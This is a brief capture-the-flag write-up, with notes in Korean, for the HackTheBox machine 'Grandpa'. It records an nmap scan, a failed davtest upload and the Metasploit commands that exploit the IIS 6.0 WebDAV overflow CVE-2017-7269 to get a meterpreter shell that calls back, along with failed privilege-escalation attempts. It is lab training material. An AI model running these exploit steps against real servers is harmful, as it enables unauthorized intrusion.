# Grandpa - HackTheBox
## Recon
```bash
sudo nmap -p 80 -sC -sV -vv -oA grandpa 10.10.10.14
```
<img width="1104" height="322" alt="image" src="https://github.com/user-attachments/assets/0ef4bf57-a566-4597-9452-0d01d8d5dc9d" />

- HTTP(80)

---
## HTTP
### davtest
- `PUT`이 허용되어서 `davtest`를 실행해보았으나 업로드가 불가.
```bash
davtest -url http://10.10.10.14
```
<img width="1104" height="509" alt="image" src="https://github.com/user-attachments/assets/9bda4a6c-e807-4f6d-b4ef-8b26288d5a09" />

### CVE-2017-7269
- `IIS 6.0`에 버퍼오버플로 취약점.
<img width="1216" height="499" alt="image" src="https://github.com/user-attachments/assets/e6ad5dc1-76c9-4263-b736-07f6a5459aea" />

<br>
<br>

- 오래된 OS 버전의 경우 수동으로 시도하면 실패하는 경우가 많아 `metasploit`을 사용.
```
msfconsole -q

msf > search cve-2017-7269

msf > use 0

msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set rhosts 10.10.10.14

msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set lhost tun0

msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run

meterpreter > shell
```
<img width="1104" height="207" alt="image" src="https://github.com/user-attachments/assets/c4891150-7011-49ec-8e72-47d24ce7ee3e" />

---
## Privesc
- `SeImpersonatePrivilege`권한이 있어 권한상승을 시도했으나 실패.
- `metasploit`의 `suggester`를 사용해보았으나 실패.

<br>

- https://0xdf.gitlab.io/2020/05/28/htb-grandpa.html
- `churrasco`를 사용해서 취약점을 공략하는데, 현재로서는 사용하지 않는 도구.


